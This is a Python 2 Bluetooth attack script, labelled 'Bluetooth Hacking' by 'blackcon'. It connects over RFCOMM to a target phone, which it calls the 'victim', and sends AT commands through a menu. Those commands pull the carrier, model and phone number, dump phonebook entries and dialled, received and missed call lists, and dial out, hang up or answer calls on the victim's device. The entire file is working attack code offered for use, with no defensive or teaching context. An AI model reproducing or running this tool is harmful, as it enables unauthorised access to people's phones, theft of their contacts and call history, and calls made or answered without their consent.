#!/usr/bin/python
#-*-coding:utf8-*-
import bluetooth
import sys

class Hack:
	def __init__(self):
		self.phoneSock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
		print '\n\n [*] Choose the number..'
		print '   [1] Get the target info'
		print '   [2] Phonebook List'
		print '   [3] Dialing'
		#print '   [4] Re Dialing'
		print '   [4] Disconnect Call'
		print '   [5] Get call'
		print '   [q] Quit'

	def getInfo(self, target, port):
		try:
			print " [+] Getting the victim information..."
			self.phoneSock.connect((target, port))
			print " [+] Information "
			self.phoneSock.send("at+cops?\r\n")#Tel company
			print " [=] Telecome : " + self.phoneSock.recv(1024).split(' ')[1].split('\"')[1]
			self.phoneSock.send("at+cgmi\r\n") #Dev company
			print " [=] Company : " + self.phoneSock.recv(1024).split(' ')[1].split('\r\n')[0]
			self.phoneSock.send("at+cgmm\r\n") #Dev model
			print " [=] Dev Model : " + self.phoneSock.recv(1024).split(' ')[1].split('\r\n')[0]
			self.phoneSock.send("at+cnum\r\n") #phone number
			print " [=] Phone number : " + self.phoneSock.recv(1024).split('\"')[1]
			
		except Exception, e:
			print e

	def getPhonebook(self, target, port):
		try:
			print " [+] Getting the book list..."
			self.phoneSock.connect((target, port))
			atCmd = "AT+CPBS=?\r\n"
			self.phoneSock.send(atCmd)
			print " [+] Selet the mode :: " + self.phoneSock.recv(1024)[2:-4]  # ("ME","SM","DC","RC","MC")
			print ' [+] ME : 저장된 번호'
			print ' [+] SM : '
			print ' [+] DC : 발신전화'
			print ' [+] RC : 수신전화'
			print ' [+] MC : 부재중전화'
			mode = raw_input(" > ")				# Input the mode that result of "AT+CPBS=?"
			atCmd = "AT+CPBS=" + mode + "\r\n"
			self.phoneSock.send(atCmd)
			print self.phoneSock.recv(1024)
			print " [+] How many gets phone number?"
			num = raw_input(" > ")
			for contact in range(int(num)):
				atCmd = 'AT+CPBR=' + str(contact+1) + '\r\n'
				self.phoneSock.send(atCmd)
				result = self.phoneSock.recv(1024).split('\"')
				print ' [%d] %s : %s ' %(contact+1, result[3], result[1])
		except Exception, e:
			print '[-]', e

	def DialingOut(self, target, port):
		try:
			print '[+] Connecting the target...'
			self.phoneSock.connect((target, port))
			print '[+] Input the phone number'
			num = raw_input(" > ")
			atCmd = 'ATD ' + num + '\r\n'	#voice call
			print '[+] Dialing...'
			self.phoneSock.send(atCmd)
			self.phoneSock.recv(1024)
		except Exception, e:
			print '[-]', e
	'''
	def ReDial(self, target, port):
		try:
			print '[+] Connection the target...'
			self.phoneSock.connect((target, port))
			self.phoneSock.send('AT+CPBS=DC\r\n')
			self.phoneSock.recv(1024)
			self.phoneSock.send('AT+CPBR=1\r\n')
			num = self.phoneSock.recv(1024).split('\"')[1]
			print '[+] Re Dialling...'
			self.phoneSock.send("ATD" + num + "\r\n")
			self.phoneSock.recv(1024)
		except Exception, e:
			print '[-]', e
	'''
	def DisconnectCall(self, target, port):
		try:
			print '[+] Connecting the target...'
			self.phoneSock.connect((target, port))
			print '[+] Disconnect.'
			self.phoneSock.send('AT+CHUP\r\n')
			self.phoneSock.recv(1024)
		except Exception, e:
			print '[-]', e
	def GetDial(self, target, port):
		try:
			print '[+] Connecting the target...'
			self.phoneSock.connect((target, port))
			print '[+] Get dialing...'
			self.phoneSock.send('ata\r\n')
			self.phoneSock.recv(1024)
		except Exception, e:
			print '[-]', e
	def __del__(self):
		self.phoneSock.close()
		
def logo():
	print "###############################"
	print "#                             #"
	print "#   Bluetooth Hacking         #"
	print "#                             #"
	print "#             by blackcon :D  #"
	print "###############################"
	

def main():
	if len(sys.argv) < 3:
		print ' Usage : %s [target] [port]' %sys.argv[0]
		exit(1)
	logo()
	target = sys.argv[1]
	port = int(sys.argv[2])
	while (1):
		c = Hack()
		sel = raw_input(" >> ")
		print ''
		if sel == "1":		c.getInfo(target, port)
		elif sel == "2":	c.getPhonebook(target, port)
		elif sel == "3":	c.DialingOut(target, port)
		#elif sel == "4":	c.ReDial(target, port)
		elif sel == "4":	c.DisconnectCall(target, port)
		elif sel == "5":	c.GetDial(target, port)
		elif sel == 'q':	break
		else:	"[-] Input error. Try again :D "
		c.__del__()
	print " Bye ~!! :D"
if __name__ == "__main__":
	main()

